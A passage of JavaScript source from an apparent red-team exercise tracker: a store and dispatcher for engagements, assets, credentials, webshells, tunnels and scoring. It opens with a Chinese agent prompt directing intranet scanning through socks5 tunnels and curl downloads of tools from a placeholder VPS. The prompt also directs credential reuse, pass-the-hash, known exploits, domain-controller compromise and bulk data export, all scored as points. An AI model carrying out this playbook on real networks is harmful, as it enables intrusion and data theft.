   - 先加载技能 \`gogo-intranet\` 铺面：\`./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af --proxy socks5://127.0.0.1:1080\`
   - 再加载技能 \`fscan-intranet\` 打点：\`./fscan -h 10.0.0.0/24 -np -nobr -nopoc -socks5 127.0.0.1:1080 -o intranet.txt\`
   - 两者都能从 VPS 载荷服务取：\`curl -o gogo http://<你的VPS_IP>:9100/gogo\`（**\`<你的VPS_IP>\` 是占位符，不要原样执行**——真实地址见技能 \`vps-reverse-shell\`）
   - **禁止手搓内网探测脚本**（bash for 循环扫端口、自己写并发 HTTP 探测）；现成工具不适用时必须说明理由。
   - 新发现资产用 \`redteam_asset_add\` 并入测绘（自动按 /24 建 C 段，并自动区分内网/外网）。
3. **凭据复用**：\`redteam_credential_list\` / \`redteam_access_list\` 盘点已有账号、哈希、密钥；优先用已有凭据横向（避免爆破告警），尝试 SSH/RDP/SMB/WinRM/数据库/中间件/后台。
   - **内网凭据同样要实测登录，Web 后台尤其不能只存不用**：浏览器经隧道访问（\`--proxy-server=socks5://127.0.0.1:1080\`）实际登录进去、确认能点页面，并抓下会话 Cookie/Token（\`redteam_access_add\` method=web-login）；登录成功才算拿到账号权限并记分，登不进去（哈希未破解 / 二次认证 / 限制来源）用 \`redteam_asset_test\` 的 \`test\` 记一行结论。
   - **优先试内网管理端**：堡垒机 / 运维平台 / 数据库后台 / 域管控制台 / 邮件与 OA 后台 —— 这些往往直接对应核心系统得分项，拿到凭据先往这里投。
4. **横向移动**：Pass-the-Hash / 票据、弱口令、未授权服务、已知漏洞（MS17-010、Shiro/Fastjson/Weblogic 等）。**内网的已知漏洞同样先查知识库与本机模板**：\`redteam_poc_search\`（按 CVE/组件）会同时查沉淀的 POC 与本机 nuclei 模板，命中就直接用（模板 \`nuclei -t <路径> -u <目标>\`，注意走隧道时加 \`-proxy socks5://127.0.0.1:1080\`）；两层都没有再去互联网或手搓，打通后回填（\`redteam_poc_add\`，脱敏 + 写 verified_note）。
5. **打核心系统**：域控、堡垒机、运维平台、代码仓库、数据库集群、备份系统 —— 拿到即记分（code=core-system）。
6. **数据**：批量导出后写 runs/，库里记路径、条数、字段概要（code=sensitive-data）。

## 得分导向
- **互联网边界突破**（code=boundary）：从外网进入内网并证明可达内网资产。
- **突破逻辑内网**（code=internal-pivot）：以内网身份横向到其它主机/网段。
- **账目红线（一）自己注册/自建的账号不算得分权限**：自助注册的账号、自己新建的用户/角色、自己给自己开的权限，都不算"拿到账号权限"（得分针对**拿到别人已有的**）。这类用 \`self_created=true\` 留痕即可——不计分、不进报告，也不要去注册账号凑分。
- **账目红线（二）自己的 VPS/自建服务器不算隧道**：只在自己服务器上开 socks5/frp/代理没碰到目标，不算边界突破或内网突破。登记隧道必须写 \`entry_kind\`：\`target-outbound\`（目标反弹 shell 到我方 / 目标上跑 frp 客户端）、\`target-http\`（经目标 WebShell 的 suo5）、\`target-agent\`（经目标已控进程转发）；纯自己服务器上开的填 \`self-only\`（标"不算突破"）。
- **内网同样只打能得分的面**：内网资产权限（数据库 / 服务器 / 域控 / 核心系统）与敏感数据；内网里那些与得分无关的配置问题、信息泄露、中低危一律不深挖（最多记一行排除结论）。
- **一次记分必填两样**：\`code\`（得分点短代码：\`web-account-user\` \`web-account-admin\` \`webshell\` \`rce\` \`server-shell\` \`db-access\` \`sensitive-data\` \`boundary\` \`internal-pivot\` \`core-system\`，先用 \`redteam_score_list\` 核对实际 code）+ \`evidence\`（**只写结果**：目标资产 + 拿到的东西）。**缺 code 或 evidence 服务端直接报错**，这一步等于没发生。
- 每完成一步立即 \`redteam_score_hit\`，并写 \`redteam_chain_add\`（**带 \`stage_code\`**：内网拿权限 = \`internal\`、搭隧道 = \`boundary\`、拿靶标 = \`target\`），保证攻击链闭合：入口 → 权限 → 横向 → 目标。能指向漏洞就带 \`vuln_id\`。

## 落库（强制）
- **入口类必须先登记再用**：WebShell → \`redteam_webshell_add\`；隧道 → \`redteam_tunnel_add\`。登记后其他角色和后续会话都能复用。
- 每个内网资产 \`redteam_asset_add\`；每次成功访问 \`redteam_access_add\`；每条凭据 \`redteam_credential_add\`。
- 每个关键动作 \`redteam_chain_add\`（stage=access/pivot/data，**并带上 \`stage_code\`**：recon 信息收集 / internet 互联网资产权限 / boundary 边界突破 / internal 内网资产权限 / target 靶标权限——**只有这 5 个值合法**，\`external\`/\`foothold\`/\`tunnel\`/\`privilege\` 已废弃，写了步骤不落在任何阶段；不传则按老 stage 兜底映射，内网动作会被串进错误阶段）。
- 隧道/WebShell 失效立刻 \`redteam_tunnel_update\` / \`redteam_webshell_update\` 标为 down，并说明原因。
- 定期 \`redteam_sessions\` 复盘可用入口，\`redteam_score_list\` 看还差哪些高分项。

## 交付
内网拓扑与已控资产、凭据清单、横向路径、核心系统战果、数据规模与当前得分。`,
}

/* ------------------------------------------------------------------ 统一操作分发 */

/**
 * 统一操作分发：CLI、HTTP 桥接、（后续）智能体工具共用同一套 op 词汇，
 * 保证界面看到的、命令行验的、智能体写的是同一条路径。
 * @param store - RedteamStore 实例。
 * @param req - `{ op, engagement, ... }`。
 * @returns 可 JSON 序列化的结果（失败时 `{ ok: false, error }`）。
 */
export function dispatch(store, req = {}) {
  const op = req.op
  try {
    if (op === 'bootstrap') {
      const engagements = store.listEngagements()
      /* 优先沿用「当前靶标」指针，其次才是最近创建的靶标 */
      const active = typeof store.activeEngagementId === 'function' ? store.activeEngagementId() : undefined
      return {
        ok: true, root: store.root, engagements,
        current: req.engagement || active || (engagements[0] && engagements[0].id) || null,
      }
    }
    if (op === 'openEngagement') {
      return { ok: true, engagement: store.openEngagement(req.name, req.scope) }
    }
    if (op === 'activateEngagement') {
      const activated = store.setActiveEngagement(req.engagement)
      return { ok: activated, current: store.activeEngagementId() }
    }
    /* 知识库是全局的（跨靶标共享），所以这几个 op 不需要 engagement */
    if (op === 'pocSearch') {
      const items = store.searchPocs(req)
      /* "现成的"有两层：本机沉淀的 POC/EXP + 本机 nuclei 模板库。一次返回，省一轮往返。 */
      const q = req.q || req.query || req.cve || req.component || ''
      const templates = q
        ? store.searchTemplates(q, Math.min(Number(req.templateLimit) || 20, 100))
        : { dir: store.nucleiTemplatesDir() || null, total: store.templateStats().total, items: [] }
      return { ok: true, items, stats: store.pocStats(), templates }
    }
    if (op === 'pocList') return { ok: true, items: store.searchPocs(req), stats: store.pocStats() }
    if (op === 'templateSearch') return Object.assign({ ok: true }, store.searchTemplates(req.q, Math.min(Number(req.limit) || 40, 200)))
    if (op === 'templateStats') return { ok: true, stats: store.templateStats() }
    if (op === 'pocGet') return Object.assign({ ok: true }, store.getPoc(req.id !== undefined ? req.id : req.code))
    if (op === 'pocSave') return Object.assign({ ok: true }, store.savePoc(req.poc || req))
    if (op === 'pocUpdate') return { ok: true, poc: store.updatePoc(req.id !== undefined ? req.id : req.code, req.patch || req) }
    if (op === 'pocDelete') return Object.assign({ ok: true }, store.deletePoc(req.id !== undefined ? req.id : req.code))
    if (op === 'pocUse') return Object.assign({ ok: true }, store.markPocUsed(req.id !== undefined ? req.id : req.code, req.used_on))
    if (op === 'pocStats') return { ok: true, stats: store.pocStats() }
    const id = req.engagement
    if (!id) throw new Error('engagement required')

    if (op === 'snapshot') return Object.assign({ ok: true }, store.snapshot(id))
    if (op === 'assets') return Object.assign({ ok: true }, store.listAssets(id, req))
    if (op === 'asset') return { ok: true, asset: store.getAsset(id, req.id) }
    if (op === 'graph') return Object.assign({ ok: true }, store.graph(id, req))
    if (op === 'attackGraph') return Object.assign({ ok: true }, store.attackGraph(id, req))
    if (op === 'stats') return { ok: true, stats: store.stats(id) }
    if (op === 'vulns') return Object.assign({ ok: true, stats: store.vulnStats(id) }, store.listVulns(id, req))
    if (op === 'addVuln') return Object.assign({ ok: true }, store.addVuln(id, req.vuln || req))
    if (op === 'updateVuln') return Object.assign({ ok: true }, store.updateVuln(id, req.id, req.patch || req))
    if (op === 'vulnStats') return { ok: true, stats: store.vulnStats(id) }
    if (op === 'credentials') return { ok: true, items: store.listCredentials(id, req) }
    if (op === 'addCredential') return Object.assign({ ok: true }, store.addCredential(id, req.credential || req))
    if (op === 'access') return { ok: true, items: store.listAccess(id, req) }
    if (op === 'addAccess') return Object.assign({ ok: true }, store.addAccess(id, req.access || req))
    if (op === 'sessions') return Object.assign({ ok: true }, store.sessionSummary(id))
    if (op === 'webshells') return { ok: true, items: store.listWebshells(id, req) }
    if (op === 'addWebshell') return Object.assign({ ok: true }, store.addWebshell(id, req.webshell || req))
    if (op === 'updateWebshell') return Object.assign({ ok: true }, store.updateWebshell(id, req.id, req.patch || req))
    if (op === 'tunnels') return { ok: true, items: store.listTunnels(id, req) }
    if (op === 'addTunnel') return Object.assign({ ok: true }, store.addTunnel(id, req.tunnel || req))
    if (op === 'updateTunnel') return Object.assign({ ok: true }, store.updateTunnel(id, req.id, req.patch || req))
    if (op === 'domains') return { ok: true, items: store.domainIndex(id, req) }
    if (op === 'web') return Object.assign({ ok: true }, store.listWeb(id, req))
    if (op === 'httpEvidence') return { ok: true, items: store.listHttpEvidence(id, req) }
    if (op === 'addHttpEvidence') return Object.assign({ ok: true }, store.addHttpEvidence(id, req.evidence || req))
    if (op === 'chain') return { ok: true, items: store.listChain(id) }
    if (op === 'addChainStep') return Object.assign({ ok: true }, store.addChainStep(id, req.step || req))
    if (op === 'report') return Object.assign({ ok: true }, store.report(id))
    if (op === 'assetTest') return Object.assign({ ok: true }, store.updateAssetTest(id, req.test || req))
    if (op === 'assessAsset') return Object.assign({ ok: true }, store.assessAsset(id, req.assess || req))
    if (op === 'scores') return Object.assign({ ok: true }, store.listScorePoints(id, req))
    if (op === 'saveScorePoint') return Object.assign({ ok: true }, store.saveScorePoint(id, req.point || req))
    if (op === 'deleteScorePoint') return Object.assign({ ok: true }, store.deleteScorePoint(id, req.id))
    if (op === 'addScoreHit') return Object.assign({ ok: true }, store.addScoreHit(id, req.hit || req))
    if (op === 'scoreChain') return Object.assign({ ok: true }, store.scoreChain(id, req))
    if (op === 'scoreReport') return Object.assign({ ok: true }, store.scoreReport(id, req))
    if (op === 'activeTests') return Object.assign({ ok: true }, store.activeTests(id, req))
    if (op === 'testStats') return { ok: true, stats: store.testStats(id) }
    if (op === 'stages') return { ok: true, items: store.listStages(id) }
    if (op === 'saveStage') return Object.assign({ ok: true }, store.saveStage(id, req.stage || req))
    if (op === 'reportTargets') return Object.assign({ ok: true }, store.reportTargets(id, req))
    if (op === 'attackFiles') return { ok: true, items: store.attackFileTree(id) }
    if (op === 'addAttackFile') return Object.assign({ ok: true }, store.addAttackFile(id, req.file || req))
    if (op === 'readAttackFile') return Object.assign({ ok: true }, store.readAttackFile(id, req.id))
    if (op === 'import') return Object.assign({ ok: true }, store.importBundle(id, req))
    if (op === 'prompts') return { ok: true, roles: store.listPrompts(id) }
    if (op === 'savePrompt') return Object.assign({ ok: true }, store.savePrompt(id, req.role, req.content))
    if (op === 'resetPrompts') return Object.assign({ ok: true }, store.resetPrompts(id, req.role))
    throw new Error(`unknown op: ${op}`)
  } catch (error) {
    return { ok: false, error: error && error.message ? error.message : String(error) }
  }
}

/**
 * 异步分发：只多一条 `probeSessions`（需要真实发起网络连接），其余转发给同步 dispatch。
 * 智能体的沙箱里连不出去，所以在 host 侧做连通性实测。
 */
export async function dispatchAsync(store, req = {}) {
  if (req.op === 'probeSessions') {
    try {
      const id = req.engagement
      if (!id) throw new Error('engagement required')
      const result = await store.probeSessions(id, req)
      return Object.assign({ ok: true }, result)
    } catch (error) {
      return { ok: false, error: error && error.message ? error.message : String(error) }
    }
  }
  return dispatch(store, req)
}

/* ------------------------------------------------------------------ 服务 */

export class RedteamStore {
  /** @param root 数据根目录（默认 $DSH_HOME/redteam） */
  constructor(root) {
    this.root = root
    this.engagementsDir = join(root, 'engagements')
    this.handles = new Map()
    mkdirSync(this.engagementsDir, { recursive: true })
  }

  /* ---------- 当前靶标 ---------- */
  currentPath() { return join(this.root, 'current') }

  /** 当前生效的靶标 id：显式指针优先，否则最近创建的靶标。 */
  activeEngagementId() {
    try {
      const raw = readFileSync(this.currentPath(), 'utf8').trim()
      if (raw && existsSync(this.dbPathOf(raw))) return raw
    } catch { /* 无指针时回退 */ }
    const list = this.listEngagements()
    return list.length ? list[0].id : undefined
  }

  /** 切换当前靶标（界面切换或智能体绑定时调用）。 */
  setActiveEngagement(id) {
    if (!id || !existsSync(this.dbPathOf(id))) return false
    mkdirSync(this.root, { recursive: true })
    writeFileSync(this.currentPath(), String(id), 'utf8')
    return true
  }

  /* ---------- 路径 ---------- */
  dirOf(id) { return join(this.engagementsDir, id) }
  metaPathOf(id) { return join(this.dirOf(id), 'engagement.yaml') }
  dbPathOf(id) { return join(this.dirOf(id), 'assets.db') }
  promptsDirOf(id) { return join(this.dirOf(id), 'agents') }

  /* ---------- 数据库句柄（按靶标缓存，dispose 时统一关闭） ---------- */
  /**
   * 打开（或按需创建）某个靶标的数据库句柄。
   * @param id - 靶标 id。
   * @param options - `{ create: true }` 时允许新建库文件（openEngagement 用）。
   */
  db(id, options = {}) {
    let handle = this.handles.get(id)
    if (handle) return handle
    if (!existsSync(this.dbPathOf(id))) {
      if (options.create !== true) throw new Error(`engagement not found: ${id}`)
      mkdirSync(this.dirOf(id), { recursive: true })
    }
    handle = new DatabaseSync(this.dbPathOf(id))
    handle.exec(DDL)
    migrate(handle)
    this.handles.set(id, handle)
    return handle
  }

  close() {
    for (const handle of this.handles.values()) {
      try { handle.close() } catch { /* 关闭失败不阻断卸载 */ }
    }
    this.handles.clear()
    if (this.kbHandle) {
      try { this.kbHandle.close() } catch { /* 忽略 */ }
      this.kbHandle = null
    }
  }

  /* ---------- 靶标生命周期 ---------- */
  listEngagements() {
    mkdirSync(this.engagementsDir, { recursive: true })
    const out = []
    for (const entry of readdirSync(this.engagementsDir, { withFileTypes: true })) {
      if (!entry.isDirectory()) continue
      const meta = readMeta(this.metaPathOf(entry.name)) || {}
      let stats = null
      try {
        if (existsSync(this.dbPathOf(entry.name))) stats = this.stats(entry.name)
      } catch { /* 库损坏时仍列出靶标 */ }
      out.push({
        id: entry.name, name: meta.target_name || entry.name,
        scope: meta.scope_cidrs || [], status: meta.status || 'active',
        created_at: meta.created_at || null, stats,
      })
    }
    return out.sort((a, b) => String(b.created_at).localeCompare(String(a.created_at)))
  }

  openEngagement(name, scope) {
    const id = slugify(name)
    mkdirSync(this.dirOf(id), { recursive: true })
    for (const sub of ['agents', 'runs', 'reports']) mkdirSync(join(this.dirOf(id), sub), { recursive: true })
    const existing = readMeta(this.metaPathOf(id))
    writeMeta(this.metaPathOf(id), {
      target_name: name,
      scope_cidrs: scope || (existing && existing.scope_cidrs) || [],
      status: 'active',
      created_at: (existing && existing.created_at) || nowIso(),
      updated_at: nowIso(),
    })
    this.db(id, { create: true }) // 建库 + 建表
    this.seedScorePoints(id)
    for (const p of this.listPrompts(id)) {
      if (!p.content) this.savePrompt(id, p.role, DEFAULT_PROMPTS[p.role] || '')
    }
    this.setActiveEngagement(id)
    return { id, name, scope: scope || [] }
  }

  /* ---------- 统计 / 查询 ---------- */
  stats(id) {
    const db = this.db(id)
    const one = (sql) => Object.values(db.prepare(sql).get() || {})[0] ?? 0
    return {
      segments: one('SELECT COUNT(*) FROM segment'),
      assets: one('SELECT COUNT(*) FROM asset'),
      liveAssets: one("SELECT COUNT(*) FROM asset WHERE state = 'live'"),
      openPorts: one("SELECT COUNT(*) FROM port WHERE state = 'open'"),
      services: one('SELECT COUNT(*) FROM service'),
      fingerprints: one('SELECT COUNT(*) FROM fingerprint'),
      passiveSignals: one("SELECT COUNT(*) FROM observation WHERE provenance = 'passive'"),
      activeSignals: one("SELECT COUNT(*) FROM observation WHERE provenance = 'active'"),
      vulns: one('SELECT COUNT(*) FROM vuln'),
      credentials: one('SELECT COUNT(*) FROM credential'),
      accesses: one('SELECT COUNT(*) FROM access_session'),
      untestedAssets: one("SELECT COUNT(*) FROM asset WHERE COALESCE(test_status, 'untested') = 'untested'"),
      blockedAssets: one("SELECT COUNT(*) FROM asset WHERE COALESCE(test_status, '') = 'blocked' OR blocked_count > 0"),
    }
  }

  snapshot(id) {
    const meta = readMeta(this.metaPathOf(id)) || {}
    return {
      engagement: {
        id, name: meta.target_name || id, scope: meta.scope_cidrs || [],
        status: meta.status || 'active', created_at: meta.created_at || null,
      },
      stats: this.stats(id),
      tests: this.testStats(id),
      segments: this.listSegments(id),
    }
  }

  listSegments(id) {
    const rows = this.db(id).prepare(`
      SELECT s.cidr, s.org, s.asn, s.country, s.city, s.source,
        (SELECT COUNT(*) FROM asset a WHERE a.segment_cidr = s.cidr) AS assets,
        (SELECT COUNT(*) FROM asset a WHERE a.segment_cidr = s.cidr AND a.state = 'live') AS live,
        (SELECT COUNT(*) FROM port p JOIN asset a ON a.id = p.asset_id WHERE a.segment_cidr = s.cidr AND p.state = 'open') AS open_ports,
        (SELECT COUNT(*) FROM port p JOIN asset a ON a.id = p.asset_id WHERE a.segment_cidr = s.cidr AND p.provenance = 'passive') AS passive_ports,
        (SELECT COUNT(*) FROM port p JOIN asset a ON a.id = p.asset_id WHERE a.segment_cidr = s.cidr AND p.provenance = 'active') AS active_ports
      FROM segment s ORDER BY assets DESC, s.cidr`).all()
    /* C 段也分内外网：按网段起始地址归属判定 */
    return rows.map((r) => Object.assign({}, r, { scope: scopeOfIp(String(r.cidr || '').split('/')[0]) }))
  }

  assetRow(db, a) {
    const ports = db.prepare(`SELECT p.port, p.proto, p.state, p.provenance, p.banner, p.url, p.title,
        s.name AS service, s.product, s.version
      FROM port p LEFT JOIN service s ON s.port_id = p.id
      WHERE p.asset_id = ? ORDER BY p.port`).all(a.id)
    const fingerprints = db.prepare('SELECT category, vendor, product, version, evidence, provenance FROM fingerprint WHERE asset_id = ?').all(a.id)
    const names = db.prepare('SELECT name, kind, provenance FROM asset_name WHERE asset_id = ?').all(a.id)
    return {
      id: a.id, ip: a.ip, segment_cidr: a.segment_cidr, state: a.state,
      primary_name: a.primary_name, first_seen: a.first_seen, last_seen: a.last_seen,
      test_status: a.test_status || 'untested', test_notes: a.test_notes || '',
      test_surface: a.test_surface || '', test_updated_at: a.test_updated_at || null,
      test_updated_by: a.test_updated_by || null, blocked_count: a.blocked_count || 0,
      priority: a.priority || null, potential: a.potential || '', assess_reason: a.assess_reason || '',
      assessed_at: a.assessed_at || null, assessed_by: a.assessed_by || null,
      scope: a.scope || scopeOfIp(a.ip),
      open_ports: ports.filter((p) => p.state === 'open').length,
      ports, fingerprints, names,
      passive: ports.filter((p) => p.provenance === 'passive').length,
      active: ports.filter((p) => p.provenance === 'active').length,
    }
  }

  listAssets(id, f = {}) {
    const db = this.db(id)
    const where = []
    const args = []
    if (f.cidr) { where.push('a.segment_cidr = ?'); args.push(f.cidr) }
    if (f.state) { where.push('a.state = ?'); args.push(f.state) }
    if (f.ip) { where.push('a.ip = ?'); args.push(f.ip) }
    if (f.port) { where.push('EXISTS (SELECT 1 FROM port p WHERE p.asset_id = a.id AND p.port = ?)'); args.push(Number(f.port)) }
    if (f.service) {
      where.push('EXISTS (SELECT 1 FROM port p JOIN service s ON s.port_id = p.id WHERE p.asset_id = a.id AND (s.name LIKE ? OR s.product LIKE ?))')
      args.push(`%${f.service}%`, `%${f.service}%`)
    }
    if (f.fingerprint) {
      where.push('EXISTS (SELECT 1 FROM fingerprint fp WHERE fp.asset_id = a.id AND (fp.product LIKE ? OR fp.vendor LIKE ? OR fp.category LIKE ?))')
      args.push(`%${f.fingerprint}%`, `%${f.fingerprint}%`, `%${f.fingerprint}%`)
    }
    if (f.provenance) {
      where.push('EXISTS (SELECT 1 FROM port p WHERE p.asset_id = a.id AND p.provenance = ?)')
      args.push(f.provenance)
    }
    if (f.priority) {
      where.push('a.priority = ?')
      args.push(f.priority)
    }
    if (f.test_status) {
      /* 支持多值：test_status=abandoned,blocked */
      const list = String(f.test_status).split(',').map((x) => x.trim()).filter(Boolean)
      if (list.length > 1) {
        where.push(`COALESCE(a.test_status, 'untested') IN (${list.map(() => '?').join(',')})`)
        args.push(...list)
      } else {
        where.push("COALESCE(a.test_status, 'untested') = ?")
        args.push(f.test_status)
      }
    }
    /* 内外网维度：internal | external（老数据在迁移时已回填） */
    if (f.scope) {
      where.push(`COALESCE(a.scope, (${SCOPE_SQL})) = ?`)
      args.push(f.scope)
    }
    if (f.q) {
      const terms = String(f.q).split(/\s+/).filter(Boolean)
      if (terms.length) {
        where.push('a.id IN (SELECT CAST(asset_id AS INTEGER) FROM asset_fts WHERE asset_fts MATCH ?)')
        args.push(terms.map((t) => `"${t.replace(/"/g, '""')}"*`).join(' AND '))
      }
    }
    const clause = where.length ? 'WHERE ' + where.join(' AND ') : ''
    const total = db.prepare(`SELECT COUNT(*) AS n FROM asset a ${clause}`).get(...args).n
    const limit = Math.min(Number(f.limit) || 200, 2000)
    const offset = Number(f.offset) || 0
    const openPorts = "COALESCE((SELECT COUNT(*) FROM port p WHERE p.asset_id = a.id AND p.state = 'open'), 0)"
    /* 排序：默认「最该打的排前面」——易打性高 → 未测 → 端口多；sort=ip / sort=ports 可切换 */
    const sort = f.sort || 'priority'
    let orderBy = 'a.ip_int'
    if (sort === 'ports') orderBy = `${openPorts} DESC, a.ip_int`
    else if (sort === 'todo') {
      /* 待测优先：把这轮还能打的先顶上来，已测/放弃的沉底 */
      orderBy = `CASE COALESCE(a.test_status, 'untested')
          WHEN 'untested' THEN 0 WHEN 'testing' THEN 1 WHEN 'tested' THEN 2
          WHEN 'blocked' THEN 3 WHEN 'abandoned' THEN 4 WHEN 'no_surface' THEN 5 ELSE 6 END,
        CASE COALESCE(a.priority, '') WHEN 'high' THEN 0 WHEN 'medium' THEN 1 WHEN 'low' THEN 2 ELSE 3 END,
        ${openPorts} DESC, a.ip_int`
    } else if (sort === 'priority') {
      orderBy = `CASE COALESCE(a.priority, '') WHEN 'high' THEN 0 WHEN 'medium' THEN 1 WHEN 'low' THEN 2 ELSE 3 END,
        CASE COALESCE(a.test_status, 'untested')
          WHEN 'untested' THEN 0 WHEN 'testing' THEN 1 WHEN 'tested' THEN 2
          WHEN 'blocked' THEN 3 WHEN 'abandoned' THEN 4 WHEN 'no_surface' THEN 5 ELSE 6 END,
        ${openPorts} DESC, a.ip_int`
    }
    const rows = db.prepare(`SELECT a.*, ${openPorts} AS open_port_count FROM asset a ${clause} ORDER BY ${orderBy} LIMIT ? OFFSET ?`)
      .all(...args, limit, offset)
    return { total, sort, items: rows.map((r) => this.assetRow(db, r)) }
  }

  getAsset(id, assetId) {
    const db = this.db(id)
    const a = db.prepare('SELECT * FROM asset WHERE id = ?').get(Number(assetId))
    if (!a) return undefined
    const detail = this.assetRow(db, a)
    detail.observations = db.prepare(`SELECT attr, value, provenance, tool, collected_at FROM observation
      WHERE entity_kind = 'asset' AND entity_id = ? ORDER BY collected_at DESC LIMIT 200`).all(a.id)
    detail.edges = db.prepare(`SELECT src_kind, src_id, dst_kind, dst_id, relation, confidence FROM edge
      WHERE (src_kind = 'asset' AND src_id = ?) OR (dst_kind = 'asset' AND dst_id = ?)`).all(String(a.id), String(a.id))
    return detail
  }

  /** 图谱投影：C 段 → 资产 → 开放端口（+ 域名解析关系）。 */
  graph(id, f = {}) {
    const db = this.db(id)
    const nodes = []
    const edges = []
    const seen = new Set()
    const push = (node) => { if (!seen.has(node.id)) { seen.add(node.id); nodes.push(node) } }
    const segs = f.cidr
      ? db.prepare('SELECT * FROM segment WHERE cidr = ?').all(f.cidr)
      : db.prepare('SELECT * FROM segment').all()
    for (const s of segs) {
      push({ id: `seg:${s.cidr}`, kind: 'segment', label: s.cidr, meta: { org: s.org, asn: s.asn } })
      for (const a of db.prepare('SELECT * FROM asset WHERE segment_cidr = ? ORDER BY ip_int').all(s.cidr)) {
        const nid = `asset:${a.id}`
        const ports = db.prepare("SELECT COUNT(*) AS n FROM port WHERE asset_id = ? AND state = 'open'").get(a.id).n
        push({ id: nid, kind: 'asset', label: a.ip, meta: { state: a.state, name: a.primary_name, ports, segment: a.segment_cidr } })
        edges.push({ source: `seg:${s.cidr}`, target: nid, relation: 'contains' })
        for (const p of db.prepare('SELECT id, port, proto, provenance FROM port WHERE asset_id = ? AND state = ?').all(a.id, 'open')) {
          const pid = `port:${p.id}`
          push({ id: pid, kind: 'port', label: `${p.port}/${p.proto}`, meta: { provenance: p.provenance, asset: a.ip } })
          edges.push({ source: nid, target: pid, relation: 'exposes' })
        }
        if (a.primary_name) {
          const did = `name:${a.primary_name}`
          push({ id: did, kind: 'domain', label: a.primary_name, meta: {} })
          edges.push({ source: did, target: nid, relation: 'resolves' })
        }
      }
    }
    return { nodes, edges }
  }

  /* ---------- 得分目标（攻防演练得分点 + 得分记录） ---------- */

  /** 首次打开靶标时播种默认得分点（已有则不动）。 */
  /** 作战阶段：首次读取时补种默认五阶段（与得分点同策略，老靶标自动获得）。 */
  seedStages(id) {
    const db = this.db(id)
    /* 自愈式补种：缺哪个补哪个（老库被上一版迁移误删的阶段会自动补回来） */
    const have = new Set(db.prepare('SELECT code FROM stage').all().map((r) => r.code))
    if (DEFAULT_STAGES.every((st) => have.has(st.code))) return { seeded: 0 }
    let order = db.prepare('SELECT COALESCE(MAX(sort_order), -1) AS n FROM stage').get().n + 1
    const stmt = db.prepare(`INSERT INTO stage(code, name, subtitle, color, goal, sections, tools, transition, sort_order, updated_at)
      VALUES(?,?,?,?,?,?,?,?,?,?)`)
    let seeded = 0
    for (const st of DEFAULT_STAGES) {
      if (have.has(st.code)) continue
      stmt.run(st.code, st.name, st.subtitle, st.color, st.goal, JSON.stringify(st.sections),
        st.tools, st.transition, order++, nowIso())
      seeded += 1
    }
    return { seeded: seeded }
  }

  listStages(id) {
    const db = this.db(id)
    this.seedStages(id)
    return db.prepare('SELECT * FROM stage ORDER BY sort_order, code').all().map((r, i) => ({
      code: r.code, name: r.name, subtitle: r.subtitle || '', color: r.color || '#64748b',
      goal: r.goal || '', sections: parseJson(r.sections, []), tools: r.tools || '',
      transition: r.transition || '',
      /* 链路里的真实位置（第几阶段）：界面画 ①②③ 与报告排序都用它，不要另行编号 */
      ordinal: i + 1,
      updated_at: r.updated_at || null,
    }))
  }

  /** 编辑阶段内容（名称/目标/手段分组/工具/ATT&CK/过渡语）。 */
  saveStage(id, patch = {}) {
    const db = this.db(id)
    if (!patch.code) throw new Error('stage.code required')
    const cur = db.prepare('SELECT * FROM stage WHERE code = ?').get(String(patch.code))
    db.prepare(`INSERT INTO stage(code, name, subtitle, color, goal, sections, tools, transition, sort_order, updated_at)
      VALUES(?,?,?,?,?,?,?,?,?,?)
      ON CONFLICT(code) DO UPDATE SET
        name = excluded.name, subtitle = excluded.subtitle, color = excluded.color, goal = excluded.goal,
        sections = excluded.sections, tools = excluded.tools,
        transition = excluded.transition, updated_at = excluded.updated_at`).run(
      String(patch.code),
      patch.name ?? (cur ? cur.name : String(patch.code)),
      patch.subtitle ?? (cur ? cur.subtitle : ''),
      patch.color ?? (cur ? cur.color : '#64748b'),
      patch.goal ?? (cur ? cur.goal : ''),
      patch.sections !== undefined ? JSON.stringify(patch.sections) : (cur ? cur.sections : '[]'),
      patch.tools ?? (cur ? cur.tools : ''),
      patch.transition ?? (cur ? cur.transition : ''),
      patch.sort_order ?? (cur ? cur.sort_order : 0),
      nowIso(),
    )
    return { code: String(patch.code), updated: true }
  }

  seedScorePoints(id) {
    const db = this.db(id)
    const n = db.prepare('SELECT COUNT(*) AS n FROM score_point').get().n
    if (n > 0) return { seeded: 0 }
    let order = 0
    for (const point of DEFAULT_SCORE_POINTS) {
      db.prepare(`INSERT INTO score_point(code, name, category, points, description, enabled, sort_order, created_at, updated_at)
        VALUES(?,?,?,?,?,1,?,?,?)`).run(
        point.code, point.name, point.category, point.points, point.description,
        order++, nowIso(), nowIso(),
      )
    }
    return { seeded: DEFAULT_SCORE_POINTS.length }
  }

  listScorePoints(id, f = {}) {
    const db = this.db(id)
    /* 老靶标没有得分点：首次读取时补种默认值 */
    if (db.prepare('SELECT COUNT(*) AS n FROM score_point').get().n === 0) this.seedScorePoints(id)
    const rows = db.prepare('SELECT * FROM score_point ORDER BY sort_order, id').all()
    const hits = db.prepare('SELECT * FROM score_hit ORDER BY recorded_at DESC').all()
    const byPoint = new Map()
    for (const h of hits) {
      if (!byPoint.has(h.point_id)) byPoint.set(h.point_id, [])
      byPoint.get(h.point_id).push(h)
    }
    const items = rows
      .filter((r) => f.enabledOnly !== true || r.enabled === 1)
      .map((r) => {
        const list = (byPoint.get(r.id) || []).map((h) => ({
          id: h.id, asset_id: h.asset_id, vuln_id: h.vuln_id, step_id: h.step_id,
          target: h.target, evidence: h.evidence, note: h.note,
          self_created: Number(h.self_created) === 1,
          recorded_by: h.recorded_by, recorded_at: h.recorded_at,
        }))
        /* 同类得分**不设数量上限，按命中次数累加**。
           **自己注册/自建的账号不计分**（self_created=1 只作过程记录，不计数也不得分）。 */
        const valid = list.filter((h) => h.self_created !== true)
        const counted = valid.length
        return {
          id: r.id, code: r.code, name: r.name, category: r.category, points: r.points,
          counted: counted, earned: counted * r.points,
          self_created: list.length - valid.length,
          description: r.description || '', enabled: r.enabled === 1, sort_order: r.sort_order,
          hits: list,
        }
      })
    const enabled = items.filter((p) => p.enabled)
    return {
      items,
      summary: {
        /* 不设上限：得分 = 命中次数 × 分值，累加即可 */
        achievedPoints: enabled.reduce((n, p) => n + p.earned, 0),
        /* 得分点个数（界面按这个显示，不再说"已拿下 N 项"） */
        pointCount: enabled.length,
        hitPointCount: enabled.filter((p) => p.counted > 0).length,
        hitCount: items.reduce((n, p) => n + p.hits.length, 0),
        countedHits: enabled.reduce((n, p) => n + p.counted, 0),
